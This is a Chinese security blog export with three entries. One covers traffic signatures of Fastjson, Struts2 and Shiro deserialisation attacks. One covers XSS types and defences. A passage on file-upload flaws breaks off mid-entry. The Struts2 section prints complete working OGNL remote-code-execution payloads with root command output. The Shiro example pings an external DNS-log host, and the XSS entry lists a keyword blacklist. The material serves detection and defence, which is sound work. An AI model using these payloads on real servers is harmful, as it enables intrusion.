id="Fastjson-反序列化漏洞的流量特征"><a href="#Fastjson-反序列化漏洞的流量特征" class="headerlink" title="Fastjson 反序列化漏洞的流量特征"></a>Fastjson 反序列化漏洞的流量特征</h1><p><a name="SaDB5"></a></p><h2 id="Fastjson-1-2-24-反序列化漏洞"><a href="#Fastjson-1-2-24-反序列化漏洞" class="headerlink" title="Fastjson 1.2.24 反序列化漏洞"></a>Fastjson 1.2.24 反序列化漏洞</h2><ul><li>特征为请求数据中含有”@type”字段</li><li>原理:Fastjson 在处理以@type 形式传入的类时，会默认调用该类的共有 set\get\is 函数<br><a name="x6NfN"></a></li></ul><h3 id="实例：-3"><a href="#实例：-3" class="headerlink" title="实例："></a>实例：</h3><p><a name="yfyPA"></a></p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617543847310-dd97f5ec-197e-462b-83c8-8936186b772b.png#height=453&id=enXuD&originHeight=685&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83989&status=done&style=none&title=&width=565" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617543847310-dd97f5ec-197e-462b-83c8-8936186b772b.png#height=453&id=enXuD&originHeight=685&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83989&status=done&style=none&title=&width=565" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></h3><p><a name="tLFvT"></a></p><h2 id="Fastjson-lt-x3D-1-2-47-反序列化漏洞"><a href="#Fastjson-lt-x3D-1-2-47-反序列化漏洞" class="headerlink" title="Fastjson &lt;&#x3D;1.2.47 反序列化漏洞"></a>Fastjson &lt;&#x3D;1.2.47 反序列化漏洞</h2><ul><li>特征为请求数据中含有”@type”:”java.lang.Class”字段</li><li>原理：利用@type 加载 dedserializers 中的 java.lang.class 类，里面传参要添加的类，从而调用 TypeUtils.loadClass()类来添加 com.sun.rowset.jdbcRowSetlmpl 类到 mapping 函数里，最后实现调用@type 的值<br><a name="slwUv"></a></li></ul><h3 id="实例：-4"><a href="#实例：-4" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617430392122-cbef956a-38fb-498e-aba2-9fe330d6cd65.png#height=606&id=yYmyL&originHeight=903&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=574" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617430392122-cbef956a-38fb-498e-aba2-9fe330d6cd65.png#height=606&id=yYmyL&originHeight=903&originWidth=856&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=574" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="rf6aM"></a></p><h1 id="Structs2-漏洞的流量特征"><a href="#Structs2-漏洞的流量特征" class="headerlink" title="Structs2 漏洞的流量特征"></a>Structs2 漏洞的流量特征</h1><p><a name="SXdxX"></a></p><h2 id="Structs-S2-015-远程代码执行漏洞"><a href="#Structs-S2-015-远程代码执行漏洞" class="headerlink" title="Structs S2-015 远程代码执行漏洞"></a>Structs S2-015 远程代码执行漏洞</h2><ul><li>payload 后面加上了.action</li><li>远程攻击者可借助带有‘${}’和‘%{}’序列值（可导致判断 OGNL 代码两次）的请求，利用该漏洞执行任意 OGNL 代码。<br><a name="wwkjf"></a></li></ul><h3 id="实例：-5"><a href="#实例：-5" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617544543930-64ac7162-db98-401f-8d78-5e0f401315b4.png#height=608&id=bMA4b&originHeight=900&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111313&status=done&style=none&title=&width=578" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617544543930-64ac7162-db98-401f-8d78-5e0f401315b4.png#height=608&id=bMA4b&originHeight=900&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111313&status=done&style=none&title=&width=578" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/S2-015/%24%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23m%3d%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2c%23m.setAccessible(true)%2c%23m.set(%23_memberAccess%2ctrue)%2c%23q%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream())%2c%23q%7d.action</span><br></pre></td></tr></table></figure><p>URL 解码后的内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="literal">false</span>,#m=#_memberAccess.getClass().getDeclaredField(<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>),#m.setAccessible(<span class="literal">true</span>),#m.set(#_memberAccess,<span class="literal">true</span>),#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>,#q&#125;.action</span><br></pre></td></tr></table></figure><p>可以看到回显中被执行的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid%3D0%28root%29%20gid%3D0%28root%29%20groups%3D0%28root%29%0A.jsp</span><br></pre></td></tr></table></figure><p>URL 解码后的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">.jsp</span><br></pre></td></tr></table></figure><p>命令执行成功<br><a name="UK2eW"></a></p><h2 id="Structs-S2-045-远程代码执行漏洞"><a href="#Structs-S2-045-远程代码执行漏洞" class="headerlink" title="Structs S2-045 远程代码执行漏洞"></a>Structs S2-045 远程代码执行漏洞</h2><ul><li>该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息，导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。</li><li>payload 在 content-type 中<br><a name="7FJCn"></a></li></ul><h3 id="实例：-6"><a href="#实例：-6" class="headerlink" title="实例："></a>实例：</h3><p><a name="HiIhV"></a></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617545998738-8b0fc3c3-7839-4ec6-a4c7-bc2a1236f4e2.png#height=454&id=uaEJg&originHeight=685&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93867&status=done&style=none&title=&width=566" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617545998738-8b0fc3c3-7839-4ec6-a4c7-bc2a1236f4e2.png#height=454&id=uaEJg&originHeight=685&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93867&status=done&style=none&title=&width=566" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></h3><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#nike=<span class="string">&#x27;multipart/form-data&#x27;</span>).(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;whoami&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(#ros=(<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getOutputStream())).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@copy(#process.getInputStream(),#ros)</span>).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p>执行的命令：<code>whoami</code><br />回显的内容：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617546428191-efe0ddad-f0af-4a22-adb1-7c36b19ad9f3.png#height=148&id=l1M5t&originHeight=166&originWidth=302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6652&status=done&style=none&title=&width=270" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617546428191-efe0ddad-f0af-4a22-adb1-7c36b19ad9f3.png#height=148&id=l1M5t&originHeight=166&originWidth=302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6652&status=done&style=none&title=&width=270" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />命令执行成功</p><p><a name="a2ZKb"></a></p><h1 id="Shiro-反序列化漏洞的流量特征"><a href="#Shiro-反序列化漏洞的流量特征" class="headerlink" title="Shiro 反序列化漏洞的流量特征"></a>Shiro 反序列化漏洞的流量特征</h1><ul><li>payload 是构造 Cookie 的 RememberMe 的值</li><li>RememberMe 的值经过了 AES 加密、Base64 编码</li><li>请求包中 RememberMe 的值通常为 512 字节，攻击者构造的 payload 的值一般远高于 512 字节<br><a name="okKtN"></a></li></ul><h3 id="实例：-7"><a href="#实例：-7" class="headerlink" title="实例："></a>实例：</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617548080333-9c0fd901-f1ac-4221-ab6f-6a4befc79eab.png#height=574&id=Ub1sN&originHeight=791&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156057&status=done&style=none&title=&width=620" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617548080333-9c0fd901-f1ac-4221-ab6f-6a4befc79eab.png#height=574&id=Ub1sN&originHeight=791&originWidth=855&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156057&status=done&style=none&title=&width=620" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />将 RememberMe 的内容通过 Shiro RememberMe 在线解密的网站进行解密操作：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617548589906-449d2610-d583-4d7c-aaa3-008cf8187ccf.png#height=984&id=Y9YbE&originHeight=984&originWidth=1801&originalType=binary&ratio=1&rotation=0&showTitle=false&size=237089&status=done&style=none&title=&width=1801" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/12901471/1617548589906-449d2610-d583-4d7c-aaa3-008cf8187ccf.png#height=984&id=Y9YbE&originHeight=984&originWidth=1801&originalType=binary&ratio=1&rotation=0&showTitle=false&size=237089&status=done&style=none&title=&width=1801" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />分析解密后的数据可以看到应该为 Runtime.getRuntime().exec()这类函数执行了 ping 命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java/lang/Runtime* getRuntime()Ljava/lang/Runtime;,- +.ping shiro.l3jj9e.ceye.io0exec<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure><p>可以判断遭受到了 Shiro 反序列漏洞的攻击</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨站脚本攻击</title>
      <link href="/2023/06/29/frontend/security/kua-zhan-jiao-ben-gong-ji/"/>
      <url>/2023/06/29/frontend/security/kua-zhan-jiao-ben-gong-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="1d4d889f"></a></p><h2 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h2><p><a name="1d4d889f-1"></a></p><h3 id="跨站脚本攻击-1"><a href="#跨站脚本攻击-1" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h3><p>跨站脚本攻击（Cross-Site Scripting,XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。当被攻击者登录到存在恶意代码的网站时，恶意代码就会运行，通过攻击获取到用户的权限，从而恶意操作。</p><p>如果 WEB 应用没有做足安全验证，那么这些攻击就很容易成功，毕竟浏览器是无法自动判断代码或数据是否是恶意的。所以如果没有足够的安全措施，诸如 cookie、tokens 等用户识别信息将会有被窃取的危险，又或者用户在输入用户账号密码时，触发了窃取账号密码的恶意代码，从而被攻击者侵入。</p><p>一般情况下，在以下两种情况下容易被 XSS 攻击：</p><ul><li>数据从一个不可靠的链接进入到一个 Web 应用程序。</li><li>没有过滤掉恶意代码的动态内容被发送给 Web 用户。</li></ul><p>恶意内容一般包括 JavaScript，但是，有时候也会包括 HTML，FLASH 或是其他浏览器可执行的代码。XSS 攻击的形式千差万别，但他们通常都会：将 cookies 或其他隐私信息发送给攻击者，将受害者重定向到由攻击者控制的网页，或是经由恶意网站在受害者的机器上进行其他恶意操作。</p><p>XSS 攻击可以分为 3 类：存储型（持久型）、反射型（非持久型）、DOM 型。</p><ul><li><strong>存储型 XSS</strong><br />注入型脚本永久存储在目标服务器（数据库）上。当浏览器请求数据时，脚本从服务器上传回并执行。</li><li><strong>反射型 XSS</strong><br />当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。</li><li><strong>基于 DOM 的 XSS</strong><br />通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于 DOM 环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</li></ul><p>造成 XSS 最主要的原因是，过于信任用户输入，简单来说，安全问题就是信任问题。客户端提交的数据本就是应用所需，无法避免，但是攻击者通过输入数据这一过程插入恶意代码对网站进行攻击，所以我们绝不能信任用户的数据输入。</p><p><a name="167c94c7"></a></p><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>这种类型的攻击危害是最直接的，一旦恶意代码被植入服务器，用户受到攻击的可能性将会比较大，因为用户是信任此服务器的，服务器返回的数据会直接执行。处理这种攻击手段，首先要遵循不信任原则–不要信任任何用户输入的数据，做足用户安全输入验证。例如留言板：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">value</span>=<span class="string">&quot;这里是用户填写的数据&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>正常情况下，用户填入留言信息，存储到数据库中，其它用户访问时取得此段信息并显示。</p><p>但这个输入并没有任何安全验证手段，因此可以通过填入以下形式的文本注入恶意代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&quot;恶意代码&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于没有任何验证，这段文本将会被发送到数据库存储起来，当其它用户查看留言时，将会直接当成 JS 代码执行。所以在处理用户输入时，应严格控制输入格式，某个数据被接受为可被显示或存储之前，使用标准输入验证机制，验证所有输入数据的长度、类型、语法以及业务规则，建立黑名单内容，对诸如”&lt;”、”&gt;”、”script”、””等等具有危害性的关键字建立正则拦截集合，供给输入验证拦截使用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> blacklist = [<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;&lt;a&gt;&quot;</span>];</span><br></pre></td></tr></table></figure><p><a name="7ba1673b"></a></p><h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>反射型 XSS 只是简单地把用户输入的数据“反射”给浏览器，也就是说攻击者需要成功诱导用户点击一个恶意链接才能攻击成功。例如下面这个例子，用户正常的发送消息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/message.php?id=10010&amp;send=Hello</span><br></pre></td></tr></table></figure><p>接受者正常显示消息”Hello”，但是当攻击者输入以下地址时:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/message.php?id=10010&amp;send=</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&quot;恶意代码&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接收者就可能会执行该段恶意代码，攻击者达到目的。</p><p>防御手段依然是不要信任用户输入，对用户输入的 URL 信息进行安全验证。</p><p><a name="aa767cdf"></a></p><h3 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a>基于 DOM 的 XSS</h3><p>通过修改页面的 DOM 节点形成的 XSS，称之为 DOM Based XSS，从效果上来说也是反射型 XSS。当用户能够通过交互修改浏览器页面中的 DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞。例如下面这个例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;write&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;test()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;t&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    div.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;a href=&quot;&#x27;</span> + str + <span class="string">&#x27;&quot;&gt;testlink&lt;/a&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面这段代码允许用户手动输入一个连接并生成 a 标签在页面中，也就是允许用户修改 dom 内容，那么只要像这样写入 input 元素的值，就成功执行了攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(&#x27;注入攻击&#x27;)</span><br></pre></td></tr></table></figure><p>首先写入一个<code>&quot;</code>结束掉<code>href=&quot;</code>，然后绑定一个 onclick 事件，当用户点击生成的 a 标签连接时，就出发了 alert 函数，如果时恶意代码，那就是成功执行了攻击。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913102168-ce3a3569-6a9b-48f6-88c1-dfdc5989a158.png#height=409&id=K8i9Z&originHeight=409&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19566&status=done&style=none&title=&width=955" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913102168-ce3a3569-6a9b-48f6-88c1-dfdc5989a158.png#height=409&id=K8i9Z&originHeight=409&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19566&status=done&style=none&title=&width=955" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="图1.png"></p><p><a name="40c519b5"></a></p><h4 id="图-1-基于-DOM-的-XSS"><a href="#图-1-基于-DOM-的-XSS" class="headerlink" title="图 1.基于 DOM 的 XSS"></a>图 1.基于 DOM 的 XSS</h4><p><a name="687bef9f"></a></p><h3 id="XSS-的一些防范"><a href="#XSS-的一些防范" class="headerlink" title="XSS 的一些防范"></a>XSS 的一些防范</h3><p>XSS 的防御是复杂的。流行的浏览器都内置了一些对抗 XSS 的措施，比如 Firefox 的 CSP、Noscript 扩展，IE 8 内置的 XSS Filter 等。而对于网站来说，也应该寻找优秀的解决方案，保护用户不被 XSS 攻击。</p><ul><li><strong>切勿使用</strong><code>**&lt;base&gt;**</code><strong>标签</strong>。<code>&lt;base&gt;</code>标签为页面上的所有链接规定默认地址或默认目标。也就是说，只要能够攻击者能够在页面中插入<code>&lt;base&gt;</code>标签，就可以通过 img、script 等拥有 src 属性的元素加载非法图片、脚本等进行网站攻击。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br />比如上面这个标签，此时加载的应该本地根路径下的<code>a.js</code>文件执行。但是攻击者成功插入了<code>&lt;base&gt;</code>标签：<br />那么此时加载的脚本将会变成来自<a href="http://www.xss.com根目录下的同名脚本,攻击者成功执行了攻击.所以在设计安全对策时,一定要过滤掉这个危险的标签./">http://www.xss.com根目录下的同名脚本，攻击者成功执行了攻击。所以在设计安全对策时，一定要过滤掉这个危险的标签。</a></p><ul><li><strong>HttpOnly</strong>。防止攻击者窃取 Cookie 最简单最有效的办法就是，开启 Cookie 的 HttpOnly 属性，一旦开启此属性，JS 将无法读取 Cookie 信息，所以任何 XSS 攻击都无法获取 Cookie，从根源上阻止了 Cookie 劫持。所以，在设计系统时，首先应该避免 Cookie 在系统中的引用，Cookie 应该是孤立的、仅存在 Http 协议的。</li><li><strong>输入检查</strong>。输入检查是最常见的手段，也是非常有效的手段。用户输入的字符应该切实跟业务相关，譬如最简单的注册用户名，只允许用户输入汉字、字母、数字和一些下划线等不具备危险性的字符，这样就能大程度地阻止由于用户输入这个交互导致的攻击漏洞。为什么说要切实跟业务相关？譬如下面这个例子：<br />用户需要一个计算的简单输入：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+2&lt;4</span><br></pre></td></tr></table></figure><p><br />如果简单粗暴地直接把<code>&lt;</code>过滤掉或者替换掉，就会对用户的意思造成曲解。<br />如果是富文本，则要根据白名单原则，仅仅允许用户输入允许使用的标签，例如<code>&lt;a&gt;</code>、<code>&lt;div&gt;</code>、<code>&lt;h&gt;</code>、<code>&lt;img&gt;</code>等比较安全的标签，再者在富文本中严格禁止事件的使用，因为富文本是不需要展示动态效果的。</p><ul><li><strong>输出检查。</strong>输出检查也能有效防止 XSS 攻击，一般来说，除了富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如使用<code>HtmlEncode</code>对即将输出到页面 HTML 进行编码，部分编码规则如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; --&gt; &amp;amp;</span><br><span class="line">&lt; --&gt; &amp;lt;</span><br><span class="line">&gt; --&gt; &amp;gt;</span><br><span class="line">&quot; --&gt; &amp;quot;</span><br><span class="line">&#x27; --&gt; &amp;#x27;</span><br><span class="line">/ --&gt; &amp;#x2F;</span><br></pre></td></tr></table></figure><p><br />HtmlEncode 不是专有名词，而是一种函数实现。在 PHP 中，实现 HtmlEncode 的函数有 htmlentities() 和 htmlspecialchars() 两个函数。<br />相应地，JavaScript 的编码方式使用 JavascriptEncode，与 HtmlEncode 不同的是，JavascriptEncode 使用<code>\</code>进行转义，转义掉一些危险字符诸如 <code>&#39;</code>、<code>&quot;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>\</code>、<code>&amp;</code>、<code>#</code> 等。<br />一般来说，在 MVC 或者 MVVM 框架中，XSS 攻击主要发生在 V 层，所以大部分的 XSS 攻击都能够在模板系统中解决。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2023/06/29/frontend/security/wen-jian-shang-chuan-lou-dong/"/>
      <url>/2023/06/29/frontend/security/wen-jian-shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="097f3733"></a></p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><a name="e05dce83"></a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令（webshell）的能力。文件上传在互联网应用中是很正常的需求，问题不是出现在需求上，而是在文件上传服务器后服务器如何处理、解析该文件，若服务器处理不恰当，则可能会造成比较严重的问题。</p><p>文件上传后导致的常见安全问题一般有：</p><ul><li>上传文件是 Web 脚本语言，服务器的 Web 容器解释并执行了用户上传的脚本，导致代码执行；</li><li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行；</li><li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</li></ul><p><a name="3da97426"></a></p><h3 id="经典例子"><a href="#经典例子" class="headerlink" title="经典例子"></a>经典例子</h3><p><a name="23e9a7f5"></a></p><h4 id="Apache-文件解析问题"><a href="#Apache-文件解析问题" class="headerlink" title="Apache 文件解析问题"></a>Apache 文件解析问题</h4><p>在 Apache 1.x、部分 2.x 中，对文件名的解析存在以下特性：Apache 对于文件名的解析是从后往前解析的，直到遇见一个 Apache 认识的文件类型为止。比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件： PhpShell.php.rar.rar.rar <span class="comment">// 上传至指定服务器根目录</span></span><br><span class="line"></span><br><span class="line">  内容如下:</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">phpinfo</span>(); <span class="comment">// 会输出php的描述信息</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为 Apache 并不认识 rar 这个文件类型，所以会一直遍历到 php 后缀，然后认为这是一个 PHP 类型的文件。也就是说，当访问该资源时候，Apache 将会将其当成 php 文件执行：</p><figure 